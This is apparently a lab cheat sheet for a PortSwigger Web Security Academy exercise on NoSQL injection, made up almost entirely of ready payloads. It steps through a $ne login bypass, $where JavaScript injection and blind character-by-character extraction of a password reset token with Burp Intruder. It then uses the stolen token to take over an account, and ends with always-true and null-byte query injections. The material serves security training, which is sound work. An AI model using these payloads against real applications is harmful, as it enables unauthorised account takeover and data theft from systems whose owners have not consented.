# NoSQL Injection Scripts

## 1. Detect Operator Injection (`$ne` bypass)
```json
{"username":"carlos","password":{"$ne":""}}
```
**Expected:** "Account locked" instead of "Invalid username or password" → vulnerable

---

## 2. Test `$where` JavaScript Evaluation
```json
{"username":"carlos","password":{"$ne":""},"$where":"0"}
{"username":"carlos","password":{"$ne":""},"$where":"1"}
```
**Expected:** Different responses → JavaScript is being evaluated

---

## 3. Count Number of Fields on User Object
```json
{"username":"carlos","password":{"$ne":""},"$where":"Object.keys(this).length == 1"}
{"username":"carlos","password":{"$ne":""},"$where":"Object.keys(this).length == 2"}
{"username":"carlos","password":{"$ne":""},"$where":"Object.keys(this).length == 3"}
{"username":"carlos","password":{"$ne":""},"$where":"Object.keys(this).length == 4"}
{"username":"carlos","password":{"$ne":""},"$where":"Object.keys(this).length == 5"}
```
**Expected:** "Account locked" on the correct number → tells you how many fields exist

---

## 4. Confirm Field Index Exists
```json
{"username":"carlos","password":{"$ne":""},"$where":"Object.keys(this)[0].match('^.*')"}
{"username":"carlos","password":{"$ne":""},"$where":"Object.keys(this)[1].match('^.*')"}
{"username":"carlos","password":{"$ne":""},"$where":"Object.keys(this)[2].match('^.*')"}
{"username":"carlos","password":{"$ne":""},"$where":"Object.keys(this)[3].match('^.*')"}
{"username":"carlos","password":{"$ne":""},"$where":"Object.keys(this)[4].match('^.*')"}
```

---

## 5. Extract Field Name (Intruder — Cluster Bomb)
```json
{"username":"carlos","password":{"$ne":""},"$where":"Object.keys(this)[§1§].match('^.{§0§}§a§.*')"}
```
**Payload 1 (index):** 0, 1, 2, 3, 4  
**Payload 2 (position):** 0-20  
**Payload 3 (character):** a-z, A-Z, 0-9  
**Look for:** "Account locked" in response

---

## 6. Verify Specific Field Name
```json
{"username":"carlos","password":{"$ne":""},"$where":"Object.keys(this)[1].match('^pwResetToken$')"}
```
**Expected:** "Account locked" → field name confirmed ✅

---

## 7. Extract Field Value (Intruder — Cluster Bomb)
```json
{"username":"carlos","password":{"$ne":""},"$where":"this.pwResetToken.match('^.{§0§}§a§.*')"}
```
**Payload 1 (position):** 0-20  
**Payload 2 (character):** a-z, A-Z, 0-9  
**Look for:** "Account locked" → that character at that position is correct

---

## 8. Verify Extracted Token Value
```json
{"username":"carlos","password":{"$ne":""},"$where":"this.pwResetToken.match('^TOKENVALUE$')"}
```
**Expected:** "Account locked" → token confirmed ✅

---

## 9. Use Token to Reset Password
```
GET /forgot-password?pwResetToken=TOKENVALUE HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION
```
Then right-click response in Repeater → **Request in browser → Original session**

---

## 10. Syntax Injection — Always True Override
```
GET /product/lookup?category=fizzy'||'1'=='1 HTTP/2
```
URL encoded:
```
GET /product/lookup?category=fizzy%27%7c%7c%271%27%3d%3d%271 HTTP/2
```

---

## 11. Null Byte — Cut Off Extra Restrictions
```
GET /product/lookup?category=fizzy'%00 HTTP/2
```
